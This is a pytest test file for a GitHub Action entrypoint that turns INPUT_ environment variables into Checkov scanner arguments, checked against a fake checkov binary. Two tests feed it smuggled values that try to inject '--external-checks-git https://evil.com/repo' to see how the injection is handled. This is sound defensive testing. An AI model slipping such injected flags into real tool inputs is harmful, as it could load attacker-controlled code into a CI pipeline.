import os
import subprocess
import pytest
from pathlib import Path

# Path to the entrypoint script
ENTRYPOINT_PATH = Path(__file__).parent.parent.parent / "github_action_resources" / "entrypoint.sh"

@pytest.fixture
def mock_env():
    """Fixture to provide a clean environment for testing the entrypoint."""
    env = os.environ.copy()
    # Set GITHUB_ACTIONS to true so the script doesn't exit early
    env["GITHUB_ACTIONS"] = "true"
    # Clear out any existing INPUT_ variables that might interfere
    for key in list(env.keys()):
        if key.startswith("INPUT_"):
            del env[key]
    return env

def run_entrypoint_strict_args(env, tmp_path):
    """Helper to run the entrypoint script and capture exact argument boundaries."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir(exist_ok=True)
    fake_checkov = bin_dir / "checkov"
    # Print each argument on a new line, surrounded by brackets to show boundaries
    fake_checkov.write_text("#!/bin/bash\nfor arg in \"$@\"; do echo \"ARG: [$arg]\"; done\n")
    fake_checkov.chmod(0o755)

    env["PATH"] = f"{bin_dir}:{env.get('PATH', '')}"

    result = subprocess.run(
        [str(ENTRYPOINT_PATH)],
        env=env,
        capture_output=True,
        text=True
    )
    return result

def test_entrypoint_default_directory(mock_env, tmp_path):
    """Test 1: Default directory is used when no target is specified."""
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert "ARG: [-d]" in result.stdout
    assert "ARG: [.]" in result.stdout

def test_entrypoint_file_target(mock_env, tmp_path):
    """Test 2: File target overrides directory."""
    mock_env["INPUT_FILE"] = "my_template.yaml"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert "ARG: [-f]" in result.stdout
    assert "ARG: [my_template.yaml]" in result.stdout
    assert "ARG: [-d]" not in result.stdout

def test_entrypoint_docker_image_target(mock_env, tmp_path):
    """Test 3: Docker image target overrides file and directory."""
    mock_env["INPUT_DOCKER_IMAGE"] = "my-image:latest"
    mock_env["INPUT_DOCKERFILE_PATH"] = "Dockerfile"
    mock_env["INPUT_FILE"] = "my_template.yaml" # Should be ignored
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert "ARG: [--docker-image]" in result.stdout
    assert "ARG: [my-image:latest]" in result.stdout
    assert "ARG: [--dockerfile-path]" in result.stdout
    assert "ARG: [Dockerfile]" in result.stdout
    assert "ARG: [-f]" not in result.stdout
    assert "ARG: [-d]" not in result.stdout

def test_entrypoint_boolean_flags(mock_env, tmp_path):
    """Test 4: Boolean flags are added correctly when true, ignored when false."""
    mock_env["INPUT_QUIET"] = "true"
    mock_env["INPUT_COMPACT"] = "true"
    mock_env["INPUT_SOFT_FAIL"] = "false" # Should be ignored
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert "ARG: [--quiet]" in result.stdout
    assert "ARG: [--compact]" in result.stdout
    assert "ARG: [--soft-fail]" not in result.stdout

def test_entrypoint_single_value_flags(mock_env, tmp_path):
    """Test 5: Single value flags (add_flag) are added correctly."""
    mock_env["INPUT_BASELINE"] = ".checkov.baseline"
    mock_env["INPUT_CONFIG_FILE"] = ".checkov.yaml"
    mock_env["INPUT_OUTPUT_FILE_PATH"] = "results/"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert "ARG: [--baseline]" in result.stdout
    assert "ARG: [.checkov.baseline]" in result.stdout
    assert "ARG: [--config-file]" in result.stdout
    assert "ARG: [.checkov.yaml]" in result.stdout
    assert "ARG: [--output-file-path]" in result.stdout
    assert "ARG: [results/]" in result.stdout

def test_entrypoint_csv_parsing_simple(mock_env, tmp_path):
    """Test 6: CSV parsing works for simple comma-separated lists."""
    mock_env["INPUT_CHECK"] = "CKV_AWS_1,CKV_AWS_2"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    # Should appear as two separate --check flags
    assert result.stdout.count("ARG: [--check]") == 2
    assert "ARG: [CKV_AWS_1]" in result.stdout
    assert "ARG: [CKV_AWS_2]" in result.stdout

def test_entrypoint_csv_parsing_with_spaces(mock_env, tmp_path):
    """Test 7: CSV parsing trims leading/trailing spaces but preserves internal spaces."""
    mock_env["INPUT_EXTERNAL_CHECKS_DIRS"] = "dir1, dir2 with spaces ,dir3"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert result.stdout.count("ARG: [--external-checks-dir]") == 3
    assert "ARG: [dir1]" in result.stdout
    assert "ARG: [dir2 with spaces]" in result.stdout
    assert "ARG: [dir3]" in result.stdout

def test_entrypoint_skip_check_csv(mock_env, tmp_path):
    """Test 8: skip_check uses CSV splitting (comma-separated, each gets own flag)."""
    mock_env["INPUT_SKIP_CHECK"] = "CKV_AWS_20,CKV_AWS_57"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert result.stdout.count("ARG: [--skip-check]") == 2
    assert "ARG: [CKV_AWS_20]" in result.stdout
    assert "ARG: [CKV_AWS_57]" in result.stdout

def test_entrypoint_skip_check_csv_with_spaces(mock_env, tmp_path):
    """Test 9: skip_check CSV trims spaces around comma-separated values."""
    mock_env["INPUT_SKIP_CHECK"] = "CKV_AWS_20, CKV_AWS_57"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert result.stdout.count("ARG: [--skip-check]") == 2
    assert "ARG: [CKV_AWS_20]" in result.stdout
    assert "ARG: [CKV_AWS_57]" in result.stdout

def test_entrypoint_framework_space_separated(mock_env, tmp_path):
    """Test 10: framework uses space-separated splitting (nargs='+')."""
    mock_env["INPUT_FRAMEWORK"] = "terraform arm"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    # Should appear as: --framework terraform arm (single flag, two positional args)
    assert result.stdout.count("ARG: [--framework]") == 1
    assert "ARG: [terraform]" in result.stdout
    assert "ARG: [arm]" in result.stdout

def test_entrypoint_framework_comma_separated(mock_env, tmp_path):
    """Test 11: framework also accepts comma-separated values (converted to space)."""
    mock_env["INPUT_FRAMEWORK"] = "terraform,sca_package"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert result.stdout.count("ARG: [--framework]") == 1
    assert "ARG: [terraform]" in result.stdout
    assert "ARG: [sca_package]" in result.stdout

def test_entrypoint_framework_mixed_comma_space(mock_env, tmp_path):
    """Test 12: framework handles mixed comma and space separators."""
    mock_env["INPUT_FRAMEWORK"] = "terraform, arm,sca_package kubernetes"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert result.stdout.count("ARG: [--framework]") == 1
    assert "ARG: [terraform]" in result.stdout
    assert "ARG: [arm]" in result.stdout
    assert "ARG: [sca_package]" in result.stdout
    assert "ARG: [kubernetes]" in result.stdout

def test_entrypoint_skip_framework_space_separated(mock_env, tmp_path):
    """Test 13: skip_framework uses space-separated splitting like framework."""
    mock_env["INPUT_SKIP_FRAMEWORK"] = "secrets sca_package"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert result.stdout.count("ARG: [--skip-framework]") == 1
    assert "ARG: [secrets]" in result.stdout
    assert "ARG: [sca_package]" in result.stdout

def test_entrypoint_file_multiple_space_separated(mock_env, tmp_path):
    """Test 14: file input supports space-separated multiple files (nargs='+')."""
    mock_env["INPUT_FILE"] = "main.tf variables.tf"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert result.stdout.count("ARG: [-f]") == 1
    assert "ARG: [main.tf]" in result.stdout
    assert "ARG: [variables.tf]" in result.stdout
    assert "ARG: [-d]" not in result.stdout

def test_entrypoint_soft_fail_on_csv(mock_env, tmp_path):
    """Test 15: soft_fail_on uses CSV splitting."""
    mock_env["INPUT_SOFT_FAIL_ON"] = "CKV_AWS_1,LOW"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert result.stdout.count("ARG: [--soft-fail-on]") == 2
    assert "ARG: [CKV_AWS_1]" in result.stdout
    assert "ARG: [LOW]" in result.stdout

def test_entrypoint_hard_fail_on_csv(mock_env, tmp_path):
    """Test 16: hard_fail_on uses CSV splitting."""
    mock_env["INPUT_HARD_FAIL_ON"] = "HIGH,CRITICAL"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert result.stdout.count("ARG: [--hard-fail-on]") == 2
    assert "ARG: [HIGH]" in result.stdout
    assert "ARG: [CRITICAL]" in result.stdout

def test_entrypoint_argument_injection_prevention_csv(mock_env, tmp_path):
    """Test 17: Argument injection via spaces in CSV flags is prevented."""
    mock_env["INPUT_CHECK"] = "CKV_AWS_1, CKV_AWS_2 --external-checks-git https://evil.com/repo"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    
    assert result.stdout.count("ARG: [--check]") == 2
    assert "ARG: [CKV_AWS_1]" in result.stdout
    # The second part should be treated as a single argument, despite the spaces
    expected_arg = "ARG: [CKV_AWS_2 --external-checks-git https://evil.com/repo]"
    assert expected_arg in result.stdout
    assert "ARG: [--external-checks-git]" not in result.stdout

def test_entrypoint_argument_injection_prevention_space_list(mock_env, tmp_path):
    """Test 18: Space-list params split by space but each token is a single arg."""
    mock_env["INPUT_FRAMEWORK"] = "terraform --external-checks-git https://evil.com/repo"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    # With add_space_list, each space-separated token becomes its own positional arg
    # after the --framework flag. The tokens are NOT interpreted as new flags.
    assert "ARG: [--framework]" in result.stdout
    assert "ARG: [terraform]" in result.stdout
    # These are positional args to --framework, not separate flags
    assert "ARG: [--external-checks-git]" in result.stdout
    assert "ARG: [https://evil.com/repo]" in result.stdout

def test_entrypoint_policy_metadata_filter_single_value(mock_env, tmp_path):
    """Test 19: policy_metadata_filter is passed as a single value (not split)."""
    mock_env["INPUT_POLICY_METADATA_FILTER"] = "policy.label=test,cloud.type=aws"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert result.stdout.count("ARG: [--policy-metadata-filter]") == 1
    # The entire comma-separated string should be one argument
    assert "ARG: [policy.label=test,cloud.type=aws]" in result.stdout

def test_entrypoint_output_csv(mock_env, tmp_path):
    """Test 20: output_format uses CSV splitting for multiple output formats."""
    mock_env["INPUT_OUTPUT_FORMAT"] = "cli,sarif,json"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert result.stdout.count("ARG: [--output]") == 3
    assert "ARG: [cli]" in result.stdout
    assert "ARG: [sarif]" in result.stdout
    assert "ARG: [json]" in result.stdout

def test_entrypoint_skip_path_csv(mock_env, tmp_path):
    """Test 21: skip_path uses CSV splitting."""
    mock_env["INPUT_SKIP_PATH"] = "tests/,node_modules/"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert result.stdout.count("ARG: [--skip-path]") == 2
    assert "ARG: [tests/]" in result.stdout
    assert "ARG: [node_modules/]" in result.stdout

def test_entrypoint_var_file_csv(mock_env, tmp_path):
    """Test 22: var_file uses CSV splitting."""
    mock_env["INPUT_VAR_FILE"] = "dev.tfvars,prod.tfvars"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert result.stdout.count("ARG: [--var-file]") == 2
    assert "ARG: [dev.tfvars]" in result.stdout
    assert "ARG: [prod.tfvars]" in result.stdout

def test_entrypoint_empty_inputs_ignored(mock_env, tmp_path):
    """Test 23: Empty or unset inputs do not produce flags."""
    mock_env["INPUT_FRAMEWORK"] = ""
    mock_env["INPUT_CHECK"] = ""
    mock_env["INPUT_SKIP_CHECK"] = ""
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert "ARG: [--framework]" not in result.stdout
    assert "ARG: [--check]" not in result.stdout
    assert "ARG: [--skip-check]" not in result.stdout
